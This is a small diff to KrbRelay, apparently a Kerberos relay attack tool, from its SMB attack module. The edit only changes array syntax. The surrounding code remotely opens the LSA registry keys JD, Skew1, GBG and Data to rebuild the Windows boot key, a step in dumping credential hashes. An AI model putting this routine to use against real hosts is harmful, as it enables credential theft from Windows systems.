@@ -41,7 +41,7 @@ namespace KrbRelay.Clients.Attacks.Smb
                 RrpServiceHelper.BaseRegCloseKey(rpc, sys, out status);
 
                 StringBuilder scrambledKey = new StringBuilder();
-                foreach (var key in new string[] { "JD", "Skew1", "GBG", "Data" }) //,
+                foreach (var key in new[] { "JD", "Skew1", "GBG", "Data" }) //,
                 {
                     var hBootKey = RrpServiceHelper.BaseRegOpenKey(rpc, hKey, $"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{key}\x00", out status);
                     var v = RrpServiceHelper.baseRegQueryInfoKey(rpc, hBootKey, out status);
